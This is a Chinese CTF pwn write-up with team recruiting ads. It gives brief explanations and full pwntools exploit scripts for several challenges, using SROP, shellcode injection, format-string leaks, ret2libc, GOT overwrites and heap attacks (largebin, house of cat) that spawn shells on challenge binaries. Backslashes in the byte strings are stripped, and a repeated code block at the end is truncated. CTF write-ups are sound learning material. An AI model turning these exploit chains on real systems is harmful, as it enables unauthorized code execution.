# 第八届御网杯 线上下线pwn writeup by Mini-Venom

> 原文: https://www.ctfiot.com/213477.html
> ID: 213477

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

线上： 

asm

思路：利用gadget控制rax=0x15，满足sigreturn的调用条件，题目给出/bin/sh字符串，用SROP打execve

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('101.200.58.4',10001)
p=process('./pwn')
bin_sh=0x40200A
rl(b'Hello Pwn')
frame=SigreturnFrame()
frame.rax=constants.SYS_execve
frame.rdi=bin_sh
frame.rsi=0
frame.rdx=0
frame.rip=0x40102D

payload=p64(0x40103D)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x40102D)+bytes(frame)
bug()
s(payload)

inter()	

ret

栈上有rwx权限，随机数，有概率溢出，一直刷就行

格式化字符串泄露栈地址，计算偏移得到读入shellcode地址，后续栈溢出返回到我们的shellcode上

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('101.200.58.4',10004)
#p = process('./pwn')

#gdb.attach(p, 'b *0x40085E')
#pause()
rl("hello,What do you want to ask?")
payload=b'%8$p'

s(payload)
stack=get_addr64()-144
pr(hex(stack))
rl(b'numbern')

shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x88,b'x00')+p64(stack)

s(payload)

inter()	

normal pwn

aarch架构堆题

漏洞：非栈上fmt，在返回时会将栈的值赋给X30寄存器

思路：pie开了和没开一样，只需要改两个字节，构造栈上rop链修改返回地址为后门

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
#context(os='linux',arch='amd64',log_level='debug')
context(log_level='debug',arch='aarch64',os='linux')  
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
io = remote('101.200.58.4',5555)
#p = process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu","-g", "1234", "./pwn"])
elf = ELF('./pwn')

def bug():
    gdb.attach(target=("localhost", 1234),
            exe=elf.path,
            gdbscript='b *$rebase(0xE40)ncnb *$rebase(0xDEC)nnnnnnnn' )
    pause()

def create(i,size):
 rl(b'Your choice:')
 sl(str(97))
 rl(b'PFdata index:')
 sl(str(i))
 rl(b'PFData size:')
 sl(str(size))
def edit(i,content):
 rl(b'Your choice:')
 sl(str(101))
 rl(b'PFdata index:')
 sl(str(i))
 rl(b'Database content:')
 s(content) 
def puts(i):
 rl(b'Your choice:')
 sl(str(115))
 rl(b'PFdata index:')
 sl(str(i))
bug()
rl(b'stderr')
pie_base=int(p.recv(11),16)-0x12128
backdoor = 0xD40+pie_base
heap=pie_base+0x12018
pr(hex(pie_base))

create(0,0x68)
edit(0,b'%12$p')
puts(0)
rl(b'Database content: ')
stack = int(p.recv(12),16)-0x38
pr(hex(stack))
payload = b'%'+ str(stack&0xFFFF).encode()+b'c%25$hn'
edit(0,payload)
puts(0)

edit(0,b'%3392c%55$hn')
puts(0)

inter() 

no_fmtstr

2.36堆题，uaf

禁止打stderr,stdout,stdin，相当于禁用了io_file的链子，只能打mp_结构体

之后larget attacke打mp_结构体

计算mp tcachebins的偏移，将tcachebin 堆块改大，free之后就可以进入tcachebin，打tcachebin attack

成功修改got表，之后触发获取权限

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('101.200.58.4',2222)
#p = process('./pwn')

def add_chunk(i,size):
 sla(b'>',str(1))
 sla(b'Index: ',str(i))
 sla(b'Size: ',str(size))
def free_chunk(i):
 sla(b'>',str(2))
 sla(b'Index: ',str(i))
def edit_chunk(i,content):
 sla(b'>',str(3))
 sla(b'Index: ',str(i))
 sla(b'Content: ',content)
def show_chunk(i):
 sla(b'>',str(4))
 sla(b'Index: ',str(i))
add_chunk(0,0x520)
add_chunk(1,0x520)
add_chunk(2,0x510)
add_chunk(3,0x540)
add_chunk(8,0x560)
add_chunk(9,0x560)
add_chunk(10,0x560)
free_chunk(0)
add_chunk(4,0x600)
show_chunk(0)
libc_base=get_addr64()-2072816
pr(hex(libc_base))

edit_chunk(0,b'a'*0x10)
show_chunk(0)
rl(b'a'*0x10)
heap_base=u64(p.recv(3).ljust(8,b'x00'))-0x20a
pr(hex(heap_base))
free_chunk(2)
edit_chunk(0,p64(libc_base+2072816)*2+p64(heap_base+0x290)+p64(libc_base+2069424-8-0x20))
add_chunk(5,0x600)
key=(heap_base+0x1ce0)>>12
free_chunk(8)
free_chunk(9)
edit_chunk(9,p64(0x404020^key))
add_chunk(11,0x560)
add_chunk(12,0x560)
edit_chunk(12,p64(0x4010a6)*4+p64(0x4011D6))
rl(b'>')
sl(str(1))
inter()	

 线下： 

skill

签到题，满足条件后ret2libc

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('3.1.30.5',9999)
#p = process('./pwn')

def add(con):
 rl("5. exit")
 sl(str(1))
 rl("Input your skill: ")
 sl(con)
add(b'song')
add(b'jump')
add(b'rap')
add(b'NBA')
rl("5. exit")
sl(str(4))
rl("music~")
rdi=0x0000000000400c83
payload=b'a'*(0x10+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4008B6)

sl(payload)

puts_addr=get_addr64()
pr(hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')

system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
'''
libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))
system,bin_sh=get_sb()
'''
rl("5. exit")
sl(str(4))
rl("music~")
payload=b'a'*(0x10+8)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
sl(payload)

inter() 

writehere

6字节溢出，和一个任意地址写，got表可打，一开始没反应过来怎么打，当时打的是栈迁移，当时只想到6字节是一个栈地址，6字节基本可以写一个地址

格式化字符串漏洞，泄露libc地址和栈地址

可以控制两次返回地址，先返回main后返回backdoor，第一次任意地址写，修改exit为main

第二次修改printf为system

没有找到可用的one_gadget

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('3.1.30.8',9999)
#p = process('./pwn')

rl("Please enter your name")

payload=b'%9$p%6$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
ogg=libc_base+0xe3afe
rl(b'0x')
stack=int(p.recv(12),16)-256
pr(hex(stack))
rdi=0x0000000000401363
rl("Come and try it out")
pay=p64(0x401273)+p64(0x40121b)+p64(stack-8)+p64(0x4012F9)
s(pay)
rl("Come and try it out")
s(b'a'*8)
rl("Congratulations on completing a big step")
s(p64(elf.got['exit']))

sleep(0.1)
s(p64(0x4010D0))

rl("Please enter your name")

payload=b'%9$p%6$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
ogg=libc_base+0xe3afe
system,bin_sh=get_sb()
rl(b'0x')
stack=int(p.recv(12),16)-528
pr(hex(stack))
rdi=0x0000000000401363
rl("Come and try it out")
pay=p64(0x401273)+p64(0x40121B)+p64(stack-8)+p64(0x4012F9)
s(pay)

rl("Come and try it out")
s(b'a'*8)
pause()
s(p64(elf.got['printf']))
pause()
s(p64(system))
rl("Please enter your name")
sl(b'$0x00')
inter() 

第二种，正确做法，当时意识到这题估计秒了

返回地址直接用6字节覆盖，而不是用p64

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')
rl("Please enter your name")

payload=b'%9$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
system,bin_sh=get_sb()

rdi=0x0000000000401363
rl("Come and try it out")

payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
#bug()
s(payload)
rl("Congratulations on completing a big step")
s(p64(elf.got['exit']))
#pause()
s(p64(0x4010D0))

rl("Please enter your name")

payload=b'aaa'
#bug()
s(payload)

rdi=0x0000000000401363
rl("Come and try it out")

payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
#bug()
s(payload)
rl("Congratulations on completing a big step")
s(p64(elf.got['printf']))
#pause()
s(p64(system))

rl("Please enter your name")
sl(b'$0x00')

inter() 

calc

第二个浪费太长时间了…….

前边一个真随机数绕过，x00爆破就行，做的时候先把前边nop掉打后边

后续就是一个数组溢出，直接打ret2libc

再写爆破脚本去打远程

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('3.1.30.6',9999)
rdi=0x00000000004015c3
def exp():
 sleep(0.1)
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
 #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(rdi))
 rl(b': ')
 sl(str(elf.got['puts']))
 rl(b': ')
 sl(str(elf.plt['puts']))

 rl(b': ')
 sl(str(0x4012C5))

 libc_base=get_addr64()-libc.sym['puts']
 pr(hex(libc_base))
 system,bin_sh=get_sb()
 pr(hex(system))
 pr(hex(bin_sh))
 rl("give me a length: ")
 #bug()
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
 #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(rdi))
 rl(b': ')
 sl(p64(bin_sh))
 rl(b': ')
 sl(str(rdi+1))
 rl(b': ')
 sl(str(system))

true=1
while true:
 p = process('./pwn')
 rl("Your name: ")
 s(b'adminx00x00')

 rl("Your password: ")
 s(b'x00'*(0x10))
 buf=p.recvline()
 a=p.recv()
 print(a)
 if b'Wrong password!' in a:
  p.close()
  continue
 else:
  print(b'success')
  exp()
  break
  
  

'''
rl("Your name: ")
sl(b'adminx00')
rl("Your password: ")
s(b'a'*(0x10))

rl("give me a length: ")
#bug()
sl(str(26))
for i in range(17):
 rl(b': ')
 sl(str(1))
rl(b': ')
#bug()
sl(str(25))
rl(b': ')
sl(str(1))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(rdi))
rl(b': ')
sl(str(elf.got['puts']))
rl(b': ')
sl(str(elf.plt['puts']))

rl(b': ')
sl(str(0x4012C5))

libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))
system,bin_sh=get_sb()
pr(hex(system))
pr(hex(bin_sh))
rl("give me a length: ")
#bug()
sl(str(26))
for i in range(17):
 rl(b': ')
 sl(str(1))
rl(b': ')
#bug()
sl(str(25))
rl(b': ')
sl(str(1))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(rdi))
rl(b': ')
sl(p64(bin_sh))
rl(b': ')
sl(str(rdi+1))
rl(b': ')
sl(str(system))
'''

#inter() 

说是有交互问题，用try写一个

true = 1
while true:
    try:
        p = process('./pwn')  # 启动进程
        rl("Your name: ")  # 提示输入名字
        s(b'adminx00x00')  # 发送名字

        rl("Your password: ")  # 提示输入密码
        s(b'x00' * (0x10))  # 发送密码

        buf = p.recvline()  # 接收一行数据
        a = p.recv()  # 接收更多数据
        print(a)  # 打印接收到的数据

        if b'Wrong password!' in a:  # 检查是否返回错误信息
            p.close()  # 关闭进程
            continue  # 继续下一轮循环
        else:
            print(b'success')  # 输出成功信息
            exp()  # 调用成功后的操作
            break  # 跳出循环

    except EOFError:
        print("Process ended unexpectedly.")  # 捕获进程意外结束的情况
        break  # 跳出循环
    except Exception as e:
        print(f"An error occurred: {e}")  # 捕获其他异常并打印错误信息
        p.close()  # 确保在发生错误时关闭进程
        break  # 跳出循环

gift

c++堆，直接调试就可以了，calloc，需要去打io_file

uaf，add三个区间的堆块

add,free,show,edit四个功能函数

正常打house of cat 之后要触发exit(0)刷新指针流

再用一次largerbin attack，任意地址写一个堆地址符合条件，刷新指针流，完成house of cat的利用

img

from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

def add1(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(1))
 rl(":")
 sl(str(size))

def add2(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(2))
 rl(":")
 sl(str(size))
def add3(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(3))
 rl(":")
 sl(str(size))
def free(i):
 rl(">> ")
 sl(str(2))
 rl(":")
 sl(str(i))
def show(i):
 rl(">> ")
 sl(str(3))
 rl(":")
 sl(str(i))
def edit(i,content):
 rl(">> ")
 sl(str(4))
 rl(":")
 sl(str(i))
 rl(":")
 s(content)

add3(0x420)#0
add1(0xa8)
add3(0x410)#2
add1(0xa0)
add3(0x450) #4
add1(0x90)
add3(0x440) #6
add1(0x90)
free(0)

show(0)
libc_base=get_addr64()-96-0x10-libc.sym['__malloc_hook']
pr(hex(libc_base))
malloc_hook,free_hook=get_hook()
system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']
free(3)
free(1)

show(1)
a=p.recv(22)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x7d0
pr(hex(heap_base))

add3(0x4ff)
free(2)
edit(0,p64(libc_base+2019280)*2+p64(heap_base+0xec0)+p64(IO_list_all-0x20))
add3(0x4ff)

fake_io_addr=heap_base+0x3a0 # 伪造的fake_IO结构体的地址

next_chain = 0
#fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE =p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(system)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE +=p64(0)            #_markers
fake_IO_FILE +=p64(0)            #_chain
fake_IO_FILE +=p64(0)            #_fileno
fake_IO_FILE +=p64(0)            #_old_offset
fake_IO_FILE +=p64(0)            #_cur_column
fake_IO_FILE += p64(heap_base)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90,b'x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0,b'x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8,b'x00')
fake_IO_FILE += p64(libc_base+libc.sym['_IO_wfile_jumps']+0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

edit(2,fake_IO_FILE)
edit(1,b'a'*(0xa0)+b'/bin/shx00')

free(4)
add3(0x4ff)
free(6)
edit(4,p64(libc_base+43249385440)*2+p64(heap_base+0x870)+p64(heap_base-336-0x20))
add3(0x4ff)

#bug()
rl(">> ")
sl(str(5))

inter()

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('101.200.58.4',10001)
p=process('./pwn')
bin_sh=0x40200A
rl(b'Hello Pwn')
frame=SigreturnFrame()
frame.rax=constants.SYS_execve
frame.rdi=bin_sh
frame.rsi=0
frame.rdx=0
frame.rip=0x40102D

payload=p64(0x40103D)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x40102D)+bytes(frame)
bug()
s(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
